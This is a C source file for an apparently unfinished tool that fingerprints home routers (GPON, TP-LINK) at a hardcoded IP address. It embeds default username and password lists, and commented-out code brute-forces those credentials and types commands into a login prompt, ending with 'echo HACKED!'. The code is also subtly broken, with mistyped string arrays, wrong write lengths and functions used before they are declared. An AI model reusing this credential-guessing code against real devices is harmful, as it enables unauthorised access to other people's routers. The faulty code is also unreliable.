#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>

char base64_map[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 
'M', 'N', 'O', 'P','Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 
'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};

char* base64_encode(char* plain) {

	char counts = 0;
	char buffer[3];
	char* cipher = malloc(strlen(plain) * 4 / 3 + 4);
	int i = 0, c = 0;

	for (i = 0; plain[i] != '\0'; i++) {
		buffer[counts++] = plain[i];
		if (counts == 3) {
			cipher[c++] = base64_map[buffer[0] >> 2];
			cipher[c++] = base64_map[((buffer[0] & 0x03) << 4) + (buffer[1] >> 4)];
			cipher[c++] = base64_map[((buffer[1] & 0x0f) << 2) + (buffer[2] >> 6)];
			cipher[c++] = base64_map[buffer[2] & 0x3f];
			counts = 0;
		}
	}

	if (counts > 0) {
		cipher[c++] = base64_map[buffer[0] >> 2];
		if (counts == 1) {
			cipher[c++] = base64_map[(buffer[0] & 0x03) << 4];
			cipher[c++] = '=';
		} else {
			cipher[c++] = base64_map[((buffer[0] & 0x03) << 4) + (buffer[1] >> 4)];
			cipher[c++] = base64_map[(buffer[1] & 0x0f) << 2];
		}
		cipher[c++] = '=';
	}

	cipher[c] = '\0';
	return cipher;
}


int main(int argc, char* argv[]) {
	int sockfd = 0,
		n = 0,
		connPort = 80;
	struct sockaddr_in
		serv_addr;
	char buff[1024],
		connAddr[] = "10.94.221.254";

	// HTTP Headers
	char** headers[] = {
		"GET /",
		"GET /login.html"
		};

	// Recognize by
	char** recognizeList[] = {
		"GPON Home Gateway",
		"url=/login.html"
		};

	// Vendor List
	char** vendorList[] = {
		"UNKNOWN",
		"CALLIX / Ericsson GPON",
		"TP-LINK 2010-2015"
		};
	int vendorCnt = 0;
	
	// Credentials
	char** users[] = {
		"admin",
		"root",
		"Admin"
		};
	char** passwords[] = {
		"admin",
		"password",
		"1234",
		"root",
		"Admin",
		"12345"
		};

	memset(buff, '\0', sizeof(buff));

	if (setSock(&sockfd) < 0)
		return 1;

	// set connection
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(connPort);
	serv_addr.sin_addr.s_addr = inet_addr(connAddr);

	if (setConn(&sockfd, &serv_addr) < 0)
		return 1;

	// BRUTE FORCE GENERATOR
	//char lox[] = "";
	//for (int i = 0; i <= (sizeof(users)/8)-1; ++i) {
	//	for (int o = 0; o <= (sizeof(passwords)/8)-1; ++o) {
	//		strcat(lox, users[i]);
	//		strcat(lox, ":");
	//		strcat(lox, passwords[o]);
	//		strcat(lox, "\n");
	//		printf(lox);
	//		memset(lox, '\0', sizeof(lox));
	//	}
	//}
	
	write(sockfd, headers[0], sizeof(headers[0]));
	write(sockfd, "\n\n", 2);
	// web part
	while((n = read(sockfd, buff, sizeof(buff) - 1)) > 0) {
		buff[n] = 0;

		// Recognize the router
		for (int i = 0; i <= (sizeof(recognizeList)/8)-1; ++i) {
			
			// First match
			if (strstr(buff,recognizeList[i])) {

				if (recognizeList[i] == recognizeList[1]) {
					vendorCnt = 1;
					break;
				}

			}

		}

		//if (strstr(buff,"d") != NULL) {
		//	write(sockfd, "root\n", 5);
		//}

		//if (strstr(buff,"Password") != NULL) {
		//	write(sockfd, "admin\n", 6);
		//	write(sockfd, "nc\n", 3);
		//}

		//if (strstr(buff, "Usage:") != NULL) {
		//	write(sockfd, "echo HACKED!\n", 13);
		//}

		// display on screen
		fputs(buff, stdout);
		printf("\n");
	}

	printf(vendorList[vendorCnt]);

	return 0;
}

int setSock(int *sockfd) {
	return (*sockfd = socket(AF_INET, SOCK_STREAM, 0));
}

int setConn(int *sockfd, struct sockaddr_in *serv_addr) {
	return connect(*sockfd, (struct sockaddr*) &*serv_addr, sizeof(*serv_addr));
}
